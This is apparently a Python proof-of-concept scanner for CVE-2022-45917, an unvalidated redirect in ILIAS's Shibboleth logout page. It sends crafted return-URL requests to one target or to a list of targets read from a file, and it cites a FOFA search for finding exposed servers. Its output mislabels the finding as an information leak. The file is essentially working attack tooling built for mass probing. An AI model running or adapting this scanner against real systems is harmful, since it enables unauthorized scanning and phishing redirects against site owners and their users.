#!/usr/bin/env python
# -*- conding:utf-8 -*-
# ILIAS 未经验证的重定向漏洞
# fofa “ILIAS”
import requests
import argparse
import sys
import urllib3
from termcolor import cprint
urllib3.disable_warnings()
color = "green"

def title():
    cprint("""
  _____ __      __ ______          ___    ___   ___   ___           _  _    _____   ___   __  ______ 
 / ____|\ \    / /|  ____|        |__ \  / _ \ |__ \ |__ \         | || |  | ____| / _ \ /_ ||____  |
| |      \ \  / / | |__    ______    ) || | | |   ) |   ) | ______ | || |_ | |__  | (_) | | |    / / 
| |       \ \/ /  |  __|  |______|  / / | | | |  / /   / / |______||__   _||___ \  \__, | | |   / /  
| |____    \  /   | |____          / /_ | |_| | / /_  / /_            | |   ___) |   / /  | |  / /   
 \_____|    \/    |______|        |____| \___/ |____||____|           |_|  |____/   /_/   |_| /_/    
                                                                                                                                                                                                                                                                                                                                                                                                              
                                                                                        Author:Henry4E36
               """,color)


class information(object):
    def __init__(self,args):
        self.args = args
        self.url = args.url
        self.file = args.file
    

    def target_url(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0"
        }  
        proxies = {
            "http": "127.0.0.1:8080"
        } 
        status = []
        list = ['/shib_logout.php?action=logout&return=https://example.com', '/ilias/shib_logout.php?action=logout&return=https://example.com']
        for i in list:
            payload = self.url + i
            try:
                res = requests.get(url=payload, headers=headers, verify=False,allow_redirects=False,timeout=5)
                print(res.status_code,res.text)
                if res.status_code == 302 and "https://example.com" in res.headers["Location"]:
                    status.append(True)                    
                else:
                    status.append(False)
            except Exception as e:
                status.append(False)
                print(f"[x] 目标系统: {self.url} 连接错误！")
        information.result(self,status)

    
    def result(self,status):
        color = "red"
        if True in status:
            cprint(f"[{chr(8730)}] 目标系统: {self.url} 存在信息泄漏!",color)
        else:
            print(f"[x] 目标系统: {self.url} 不存在信息泄漏")

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description='ILIAS 未经验证的重定向漏洞')
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 CVE-2022-45917.py -u http://127.0.0.1\neg2:>>>python3 CVE-2022-45917 -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()
  
      

